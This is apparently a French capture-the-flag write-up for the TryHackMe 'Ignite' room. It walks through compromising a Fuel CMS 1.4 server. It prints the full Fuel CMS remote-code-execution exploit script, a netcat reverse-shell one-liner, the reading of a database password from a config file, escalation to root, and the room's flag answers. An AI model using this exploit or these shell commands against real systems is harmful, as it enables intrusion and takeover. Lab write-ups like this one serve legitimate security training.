# Ignite #

**Énumération**

Nmap
```bash

tim@kali:~/Bureau/tryhackme/ignite$ sudo nmap -A 10.10.77.230
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-13 11:08 CEST
Nmap scan report for 10.10.77.230
Host is up (0.068s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/13%OT=80%CT=1%CU=44350%PV=Y%DS=2%DC=T%G=Y%TM=60ED581
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%II=I%TS=A)SEQ(SP=1
OS:01%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=A)SEQ(SP=100%GCD=1%ISR=106%TI=Z%CI=I%
OS:TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5
OS:=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=
OS:68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   31.63 ms 10.9.0.1
2   70.46 ms 10.10.77.230

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.17 seconds
```

Ici on voit qu'il y a in port 80 ouvert.
Un un fichier http-robot.txt qui cache un lien /fuel/.

On vas sur le site avec un navigateur lynx.
```bash 
lynx 10.10.77.130
Welcome to Fuel CMS

Version 1.4

Getting Started

    1. 1

Change the Apache .htaccess file
       Change the Apache .htaccess found at the root of FUEL CMS's installation folder to the proper RewriteBase directory. The default is your web server's root directory (e.g "/"), but if you have FUEL CMS installed in a sub
       folder, you will need to add the path to line 5. If you are using the folder it was zipped up in from GitHub, it would be RewriteBase /FUEL-CMS-master/.
       In some server environments, you may need to add a "?" after index.php in the .htaccess like so: RewriteRule .* index.php?/$0 [L]
       NOTE: This is the only step needed if you want to use FUEL without the CMS.
    2. 2

Install the database
       Install the FUEL CMS database by first creating the database in MySQL and then importing the fuel/install/fuel_schema.sql file. After creating the database, change the database configuration found in
       fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database to match the new database you created.
    3. 3

Make folders writable
       Make the following folders writable (666 = rw-rw-rw, 777 = rwxrwxrwx, etc.):
          + /var/www/html/fuel/application/cache/
            (folder for holding cache files)
          + /var/www/html/fuel/application/cache/dwoo/
            (folder for holding template cache files)
          + /var/www/html/fuel/application/cache/dwoo/compiled
            (for writing compiled template files)
          + /var/www/html/assets/images
            (for managing image assets in the CMS)
    4. 4

Make configuration changes
          + In the fuel/application/config/config.php, change the $config['encryption_key'] to your own unique key.
          + In the fuel/application/config/MY_fuel.php file, change the $config['fuel_mode'] configuration property to AUTO. This must be done only if you want to view pages created in the CMS.
          + In the fuel/application/config/config.php file, change the $config['sess_save_path'] configuration property to a writable folder above the web root to save session files OR leave it set to NULL to use the default PHP
            setting.

That's it!

   To access the FUEL admin, go to:
   http://10.10.77.230/fuel
   User name: admin
   Password: admin (you can and should change this password and admin user information after logging in)
```

On voit ici deux chose intéressante.
- On est sur un CMS : CMS Fuel version 1.4
- Le login et mot de passe est admin admin

Regardons si il existe un exploit pour CMS Fuel version 1.4.

```bash
tim@kali:/usr/share/exploitdb$ searchsploit fuel cms
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                                                                                  | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                                                                                  | php/webapps/49487.rb
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                                                                                        | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                                                                            | php/webapps/48778.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------

```

Ici on a 2 exploits qui permette d'exécuter du code à distance.  
Prenons le premier.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cp /usr/share/exploitdb/exploits/linux/webapps/47138.py ./
```

Modifions avec notre fichier avec notre propre ip.
Supprimons la gestion avec Burp.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat -n 47138.py 
     1	# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
     2	# Date: 2019-07-19
     3	# Exploit Author: 0xd0ff9
     4	# Vendor Homepage: https://www.getfuelcms.com/
     5	# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
     6	# Version: <= 1.4.1
     7	# Tested on: Ubuntu - Apache2 - php5
     8	# CVE : CVE-2018-16763
     9	
    10	
    11	import requests
    12	import urllib
    13	
    14	url = "http://10.10.77.230:80"
    15	def find_nth_overlapping(haystack, needle, n):
    16	    start = haystack.find(needle)
    17	    while start >= 0 and n > 1:
    18	        start = haystack.find(needle, start+1)
    19	        n -= 1
    20	    return start
    21	
    22	while 1:
    23		xxxx = raw_input('cmd:')
    24		burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
    25		proxy = {"http":"http://127.0.0.1:8080"}
    26		r = requests.get(burp0_url, proxies=proxy)
    27	
    28		html = "<!DOCTYPE html>"
    29		htmlcharset = r.text.find(html)
    30	
    31		#begin = r.text[0:20]
    32		dup = find_nth_overlapping(r.text,begin,2)
    33	
    34		print r.text[0:dup]



tim@kali:~/Bureau/tryhackme/write-up$ sed -i 's/127.0.0.1:8881/10.10.77.230/g' 47138.py
tim@kali:~/Bureau/tryhackme/write-up$ sed -i 's/burp0_url/url/g' 47138.py 
tim@kali:~/Bureau/tryhackme/write-up$ sed -i 's/url, proxies=proxy/url/g' 47138.py 
```

Exécution l'exploit.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python 47138.py 
cmd:"ls"
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt

<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

<h4>A PHP Error was encountered</h4>

<p>Severity: Warning</p>
<p>Message:  preg_match(): Delimiter must not be alphanumeric or backslash</p>
<p>Filename: controllers/Pages.php(924) : runtime-created function</p>
<p>Line Number: 1</p>


	<p>Backtrace:</p>
	
		
	
		
	
		
	
		
			<p style="margin-left:10px">
			File: /var/www/html/fuel/modules/fuel/controllers/Pages.php(924) : runtime-created function<br />
			Line: 1<br />
			Function: preg_match			</p>

		
	
		
	
		
			<p style="margin-left:10px">
			File: /var/www/html/fuel/modules/fuel/controllers/Pages.php<br />
			Line: 932<br />
			Function: array_filter			</p>

		
	
		
	
		
			<p style="margin-left:10px">
			File: /var/www/html/index.php<br />
			Line: 364<br />
			Function: require_once			</p>

		
	

</div>
```

Il faut bien mettre la commande entre "" sinon ça ne fonctionne pas.

Mettons en place un reverse shell.
Ecoutons le port 1234
```bash
tim@kali:~/Bureau/tryhackme/ignite$ nc -lvnp 1234
listening on [any] 1234 ...
```

Dans un autre terminal exécutons un reverse shell.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python  47138.py
cmd:rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.228.66 1234 >/tmp/f
```

Revenons l'écoute du port 1234 et allons récupérer la première solution.
```bash
im@kali:~/Bureau/tryhackme/ignite$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.100.197] 50468
/bin/sh: 0: can't access tty; job control turned off
$
$ cd /home/
$ ls
www-data
$ cd www-data
$ ls
flag.txt
$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```

Voilà on a notre solution : 6470e394cbf6dab6a91682cc8585059b


On va trouver une solution pour augmenter nos privilèges pour devenir administrateur.
Quand on à été sur le site nous avons eu le message :
```bash
Install the database
       Install the FUEL CMS database by first creating the database in MySQL and then importing the fuel/install/fuel_schema.sql file. After creating the database, change the database configuration found in
       fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database to match the new database you created.
    3. 3
```

Qui nous indique qu'il avoir des mots de passes dans le fichier database.php  
Cherchons-le regardons si il y un mot de passe.  

```bash
$ find / -name database.php 2>/dev/null
/var/www/html/fuel/application/config/database.php

cat /var/www/html/fuel/application/config/database.php | grep password
$ cat /var/www/html/fuel/application/config/database.php | grep password
|	['password'] The password used to connect to the database
	'password' => 'mememe',

```

Stabilisons notre terminal.
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Connection nous pour devenir super utilisateur.
```bash
www-data@ubuntu:/var/www/html$ su root 
su root
Password: mememe

root@ubuntu:/var/www/html# whoami
whoami
root
```

Voilà nous somme root donc super utilisateur.  
Récupérons le dernier flag.
```bash
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 
```

Voilà la réponse : b9bbcb33e11b80be759c4e844862482d